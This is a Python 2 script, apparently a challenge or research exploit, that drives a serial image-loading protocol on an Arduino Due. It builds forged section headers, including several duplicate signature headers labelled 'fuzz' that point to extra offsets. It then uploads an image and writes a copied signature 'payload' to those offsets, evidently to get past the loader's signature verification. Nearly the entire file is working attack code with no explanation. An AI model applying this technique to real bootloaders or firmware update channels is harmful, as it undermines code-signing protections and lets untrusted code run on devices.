import time
import serial
import struct

# Offsets
fix_offset = 0x2007093C
code_offset = 0x0041
data_offset = 0x1000
sign_offset = 0x0001
# Sizes
code_size   = 0x03C8
data_size   = 0x0344
sign_size   = 0x0040
# Codes from the prog.img binary
hcode="\x63\x6F\x64\x65" + "\x40\x00\x00\x00" + struct.pack('<i', code_offset) + struct.pack('<i', code_size)
hdata="\x64\x61\x74\x61" + "\x08\x04\x00\x00" + struct.pack('<i', data_offset) + struct.pack('<i', data_size)
hsign="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', sign_offset) + struct.pack('<i', sign_size)
hfuzz="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3000) + struct.pack('<i', sign_size)
hfuzz1="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3100) + struct.pack('<i', sign_size)
hfuzz2="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3200) + struct.pack('<i', sign_size)
hfuzz3="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3300) + struct.pack('<i', sign_size)
hfuzz4="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3400) + struct.pack('<i', sign_size)
hfuzz5="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3500) + struct.pack('<i', sign_size)
hfuzz6="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3600) + struct.pack('<i', sign_size)
hfuzz7="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3700) + struct.pack('<i', sign_size)
hfuzz8="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3800) + struct.pack('<i', sign_size)
hfuzz9="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3900) + struct.pack('<i', sign_size)
hfuzzA="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3A00) + struct.pack('<i', sign_size)
hfuzzB="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3B00) + struct.pack('<i', sign_size)
hfuzzC="\x73\x69\x67\x6E" + "\x4C\x07\x00\x00" + struct.pack('<i', 0x3C00) + struct.pack('<i', sign_size)

hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hcode += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F"

hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hdata += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F"

hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65"
hsign += "\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F\x64\x65\x63\x6F"

def chksum( code ):
	eax = 0;
	for c in code:
		edx = ord(c)
		edx <<= 8
		eax ^= edx
		for x in range(0, 8):
			if eax & 0x8000:
				eax ^= 0x8380
			eax *= 2
	eax >>= 8
	return chr(eax)

def sendSerial( payload ):
	data = chr(len(payload)) + payload + chksum(payload)
	ser.write(data)
	# print payload

# ser = serial.Serial(port='COM4') # for Windows
ser = serial.Serial(port='/dev/serial/by-id/usb-Arduino_LLC_Arduino_Due-if00') # for Linux
# ser = serial.Serial(port='/dev/tty.usbmodem1a151') # for Mac

print "Hi: ",
sendSerial("\x00")
print ser.read(4) # Wait for ACK


# CODE HEADER
print "Code frame: " + hex(code_offset) + " - " + hex(code_offset+code_size)
sendSerial("\x03" + hcode)
print ser.read(4) # Wait for ACK

# DATA HEADER
print "Data frame: " + hex(data_offset) + " - " + hex(data_offset+data_size)
sendSerial("\x03" + hdata)
print ser.read(4) # Wait for ACK

# SIGN HEADER
print "Sign frame: " + hex(sign_offset) + " - " + hex(sign_offset+sign_size)
sendSerial("\x03" + hsign)
print ser.read(4) # Wait for ACK

#Fuzz header
print "Sending fuzz header: ",
sendSerial("\x03" + hfuzz)
print ser.read(4)

print "Sending fuzz header: ",
sendSerial("\x03" + hfuzz1)
print ser.read(4)
print "Sending fuzz header: ",
sendSerial("\x03" + hfuzz2)
print ser.read(4)
print "Sending fuzz header: ",
sendSerial("\x03" + hfuzz3)
print ser.read(4)



## Open file and send contents
f = open('prog.img', 'r')

# Code
print "Sending code..."
f.seek(0x40)
for i in xrange(code_offset, code_offset+code_size, 0x80):
	if(((code_offset+code_size)-i) >= 0x80):
		sendSerial("\x01" + struct.pack('<i', i) + f.read(0x80))
	else:
		sendSerial("\x01" + struct.pack('<i', i) + f.read((code_offset+code_size)-i))
	print hex(i) + " : ",
	print ser.read(4)

# Data
print "Sending data..."
for i in xrange(data_offset, data_offset+data_size, 0x80):
	if(((data_offset+data_size)-i) >= 0x80):
		sendSerial("\x01" + struct.pack('<i', i) + f.read(0x80))
	else:
		sendSerial("\x01" + struct.pack('<i', i) + f.read((data_offset+data_size)-i))
	print hex(i) + " : ",
	print ser.read(4)

# Sign
print "Sending sign..."
for i in xrange(sign_offset, sign_offset+sign_size, 0x80):
	if(((sign_offset+sign_size)-i) >= 0x80):
		sendSerial("\x01" + struct.pack('<i', i) + f.read(0x80))
	else:
		sendSerial("\x01" + struct.pack('<i', i) + f.read((sign_offset+sign_size)-i))
	print hex(i) + " : ",
	print ser.read(4)

# Payload
f.seek(0x74C)
payloadoffset = 0x3000
payload = f.read(0x40)
off = 0
for i in range(0, 4):
	sendSerial("\01" + struct.pack('<i', payloadoffset+off) + payload)
	off += 0x100
	print "payload at ", hex(payloadoffset),
	print " ", len(payload),
	print " bytes : ",
	print ser.read(4)


# End
print "Bye: ",
sendSerial("\x02")
print ser.read(4) # Wait for ACK

# Response
print ser.read(0x248)
ser.close()




exit()
